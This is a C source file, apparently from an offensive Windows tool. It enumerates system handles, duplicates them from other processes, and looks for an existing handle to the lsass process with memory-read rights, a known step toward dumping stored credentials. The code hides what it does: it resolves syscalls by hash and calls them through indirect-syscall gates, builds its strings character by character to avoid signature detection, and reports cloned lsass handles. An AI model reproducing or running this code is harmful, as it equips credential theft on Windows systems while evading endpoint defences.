#include "HandleTools.h"


PSYSTEM_HANDLE_INFORMATION get_handles(struct fPtrs* ptr_functions) {

    NTSTATUS                    status = STATUS_UNSUCCESSFUL;
    PVOID                       buffer = NULL;
    ULONG                       bufferSize = 0;
    PSYSTEM_HANDLE_INFORMATION handleInfo = NULL;

    DWORD dwSuccess = FAIL;
    Syscall sysNtQuerySystemInformation = { 0x00 };

    dwSuccess = getSyscall(0xaf0d30ec, &sysNtQuerySystemInformation);
    if(dwSuccess == FAIL)
      goto exit;

    do {
        PrepareSyscall(sysNtQuerySystemInformation.dwSyscallNr, sysNtQuerySystemInformation.pRecycledGate);
        status = DoSyscall((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, buffer, bufferSize, &bufferSize);
        if (!NT_SUCCESS(status)) {
            if (status == STATUS_INFO_LENGTH_MISMATCH) {
                if (buffer != NULL)
                    ptr_functions->_VirtualFree(buffer, 0, MEM_RELEASE);
                buffer = ptr_functions->_VirtualAlloc(NULL, bufferSize, MEM_COMMIT, PAGE_READWRITE);
                continue;
            }
            break;
        }
        else {
            handleInfo = (PSYSTEM_HANDLE_INFORMATION)buffer;
            break;
        }
    } while (1);

exit:

    return handleInfo;

}

HANDLE check_handles(PSYSTEM_HANDLE_INFORMATION handle_info, DWORD in_pid, char* ptr_output, struct fPtrs* ptr_functions) {

    POBJECT_TYPE_INFORMATION objectTypeInfo = NULL;
    PSYSTEM_HANDLE entry_info = NULL;
    NTSTATUS status = 0;
    HANDLE dupHandle = NULL, h_process = NULL, h_return = NULL;
    ULONG idx_handle = 0x00;

    OBJECT_ATTRIBUTES ObjectAttributes;
    InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);

    CLIENT_ID uPid = { 0 };

    char handle_name[MAX_PATH] = { 0 };
    char process_path[MAX_PATH] = { 0 };
    char* process_name = NULL;

    wchar_t str_process[] = { L'P',L'r',L'o',L'c',L'e',L's',L's', 0x00 };
    char str_lsass[] = { 'l','s','a','s','s', 0x00 };

    DWORD dwSuccess = FAIL;
    Syscall sysNtOpenProcess = { 0x00 }, sysNtDuplicateObject = { 0x00 }, sysNtQueryObject = { 0x00 };

    dwSuccess = getSyscall(0x1141831c, &sysNtOpenProcess);
    if(dwSuccess == FAIL)
      goto exit;

    dwSuccess = getSyscall(0x62caad5d, &sysNtDuplicateObject);
    if(dwSuccess == FAIL)
      goto exit;

    dwSuccess = getSyscall(0x60c355b0, &sysNtQueryObject);
    if(dwSuccess == FAIL)
      goto exit;

    for (idx_handle = 0; idx_handle < handle_info->HandleCount; idx_handle++) {

        entry_info = &handle_info->Handles[idx_handle];

        if (in_pid && in_pid != entry_info->ProcessId)
            continue;

        // Checking some granted access. The internet says, NtDuplicateObject() might hang on these rights
        if (entry_info->GrantedAccess != 0x0012019f && entry_info->GrantedAccess != 0x001a019f && entry_info->GrantedAccess != 0x00120189 && entry_info->GrantedAccess != 0x00100000) {

            if (objectTypeInfo != NULL) {
                ptr_functions->_VirtualFree(objectTypeInfo, 0, MEM_RELEASE);
                objectTypeInfo = NULL;
            }

            uPid.UniqueProcess = entry_info->ProcessId;
            uPid.UniqueThread = 0;

            PrepareSyscall(sysNtOpenProcess.dwSyscallNr, sysNtOpenProcess.pRecycledGate);
            status = DoSyscall(&h_process, PROCESS_QUERY_INFORMATION | PROCESS_DUP_HANDLE, &ObjectAttributes, &uPid);
            if (!NT_SUCCESS(status)){
                goto cleanup;
            }

            PrepareSyscall(sysNtDuplicateObject.dwSyscallNr, sysNtDuplicateObject.pRecycledGate);
            status = DoSyscall(h_process, (HANDLE)(uint64_t)entry_info->Handle, NtCurrentProcess(), &dupHandle, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, 0, 0);
            if (!NT_SUCCESS(status)) {
                goto cleanup;
            }

            objectTypeInfo = (POBJECT_TYPE_INFORMATION)ptr_functions->_VirtualAlloc(0, 0x1000, MEM_COMMIT, PAGE_READWRITE);
            if (objectTypeInfo == NULL) {
                goto cleanup;
            }

            PrepareSyscall(sysNtQueryObject.dwSyscallNr, sysNtQueryObject.pRecycledGate);
            status = DoSyscall(dupHandle, (OBJECT_INFORMATION_CLASS)ObjectTypeInformation, objectTypeInfo, 0x1000, NULL);
            if (!NT_SUCCESS(status)){
                goto cleanup;
            }

            if (ptr_functions->_strcmpW(objectTypeInfo->TypeName.pBuffer, str_process))
                goto cleanup;

            if (!ptr_functions->_GetModuleFileNameExA(dupHandle, NULL, handle_name, MAX_PATH))
                goto cleanup;

            if (!ptr_functions->_GetProcessImageFileNameA(h_process, process_path, MAX_PATH))
                goto cleanup;

            if (ptr_functions->_strstrA(handle_name, str_lsass) != NULL && (((PROCESS_QUERY_INFORMATION | PROCESS_VM_READ) & entry_info->GrantedAccess) != 0)) {

                process_name = (char*)ptr_functions->_PathFindFileNameA(process_path);

                char msg_found[] = { '[','+',']',' ','F','o','u','n','d',' ','a','n','d',' ','s','u','c','c','e','s','s','f','u','l','l','y',' ','c','l','o','n','e','d',' ','h','a','n','d','l','e',' ','(','%','d',')',' ','t','o',' ','l','s','a','s','s',' ','i','n',':',' ','%','s',' ','(','%','d',')','\n', 0x00 };
                char msg_handle_rights[] = { '\t','[','+',']',' ','H','a','n','d','l','e',' ','R','i','g','h','t','s',':',' ','%','x','\n', 0x00 };

                char tmp[512] = { 0x00 };
                char tmp_1[512] = { 0x00 };

                ptr_functions->_wsprintfA(tmp, msg_found, uPid.UniqueProcess, process_name, uPid.UniqueProcess);
                ptr_functions->_wsprintfA(tmp_1, msg_handle_rights, entry_info->GrantedAccess);

                ptr_functions->_lstrcatA(ptr_output, tmp);
                ptr_functions->_lstrcatA(ptr_output, tmp_1);

                h_return = dupHandle;
                
                if (in_pid)
                    break;

            }

cleanup:
            if(dupHandle) {
                ptr_functions->_CloseHandle(dupHandle);
                dupHandle = NULL;
            }

            if(h_process) {
                ptr_functions->_CloseHandle(h_process);
                h_process = NULL;
            }

        }

    }

exit:

    if (h_process != NULL)
        ptr_functions->_CloseHandle(h_process);
 
   if (objectTypeInfo != NULL)
        ptr_functions->_VirtualFree(objectTypeInfo, 0, MEM_RELEASE);

    return h_return;

}
